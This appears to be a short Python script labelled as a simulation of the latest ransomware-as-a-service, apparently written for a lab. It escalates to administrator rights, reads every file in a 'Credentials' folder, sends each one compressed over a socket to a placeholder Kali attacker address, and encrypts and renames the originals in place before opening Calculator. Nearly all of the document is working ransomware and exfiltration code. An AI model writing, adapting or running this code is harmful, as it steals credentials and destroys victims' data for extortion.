#python3
#pretending latest raas

import os
import zlib
import requests
from cryptography.fernet import Fernet
import glob
import socket
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    key = Fernet.generate_key()
    with open("raas.key", "wb") as key_file:
        key_file.write(key)

    def load_key():
        return open("raas.key", "rb").read()

    key = load_key()
    f = Fernet(key)
    Filenames = glob.glob("./Credentials/*")

    def socket_client(data):
        client_socket = socket.socket()  # instantiate
        client_socket.connect(("<Kali IP>", 5000))
        client_socket.send(compressed)
        client_socket.close()

    for x in range(len(Filenames)):
        with open (Filenames[x],  'rb') as file:
            session = requests.Session()
            original_files = file.read()
            compressed = zlib.compress(original_files, level=9)
            socket_client(compressed)
            encrypted_data = f.encrypt(original_files)
            encrypted_name = str(Filenames[x]) + ".E1fWSO0x2p"
            with open (Filenames[x],  'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)

        os.rename(Filenames[x], encrypted_name)

    os.startfile("C:/Windows/System32/calc.exe")
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

    
